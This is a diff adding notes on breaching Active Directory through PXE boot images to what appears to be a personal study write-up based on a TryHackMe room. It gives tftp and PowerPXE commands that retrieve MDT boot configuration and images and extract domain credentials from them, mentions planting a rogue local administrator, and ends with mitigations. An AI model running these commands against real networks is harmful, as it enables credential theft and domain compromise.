@@ -100,9 +100,59 @@ PXE boot allow new devices that are connected to the netowkr to  load and instal
 7. Client requests PXE Boot via TFTP
 8. Server delivers PXE Boot via TFTP
 
+Boot image can exploitationed:
+1. Inject a privilege escalation vector - preload a nefarious Local Administrator 
+1. Perform password scraping attacks to recover AD credential during installation 
+
+#### PXE Boot Image Retrieval
+
+1. Firstly attempt to request an IP and the PXE boot preconfigure details via DHCP from the MDT server
+2. Secondly use TFTP to request each of the BCD files and enumerate the configurations
+- Note these parts are not included included in the [THM Breaching AD Room](https://tryhackme.com/room/breachingad). 
+
+```batch
+tftp -i $MDT-SERVER-IP GET "pxee-boot-image-name.bcd" conf.bcd
+```
+
+3. Use [Powerpxe-github](https://github.com/wavestone-cdt/powerpxe) to read the \*.bcd file(s)
+
+```powershell
+Import-Module .\PowerPXE.ps1
+$BCDFile = "conf.bcd"
+Get-WimFile -bcdFile $BCDFile
+# >>>> Identify wim file : 
+# <PXE Boot Image Location will be outputed here
+```
+
+Download with tftp 
+```powershell 
+tftp -i $MDT-SERVER-IP GET "<PXE Boot Image Location>" pxeboot.wim
+# Once downloaded use the PowerPXE module to extract credentials
+Get-FindCredentials -WimFile pxeboot.wim
+```
 
 
 ## Configuration Files
+
+Depending on the host various configuration files contain useful in extracting AD credentials 
+-   Web application config files   
+-   Service configuration files
+-   Registry keys
+-   Centrally deployed applications - these usually need to authenicate to the domain during installation and execution 
+
+Scripts like:
+[Seatbelt](https://github.com/GhostPack/Seatbelt)
+
+Can be used to automate this process.
+
+## Mitigation
+1. User awareness and training about disclosing sensitive information and not trusting suspicious emails
+2. Limit exposure of AD services and application from the Internet
+3. Enforce Network Access NAC  to prevent rogue devices
+4. Enforce SMB signing - prevent relay attacks
+5. Principle of least privileges 
+
+
 
 ## References
 [THM AD Basics Room](https://tryhackme.com/room/activedirectorybasics)
@@ -118,3 +168,4 @@ PXE boot allow new devices that are connected to the netowkr to  load and instal
 [r3d-buck3t](https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210)
 [Microsoft Deployment Toolkit](https://www.microsoft.com/en-gb/download/details.aspx?id=54259)
 [Medium: Pwning Printers with LDAP Pass-Back Attack](https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210)
+[Powerpxe-github](https://github.com/wavestone-cdt/powerpxe)
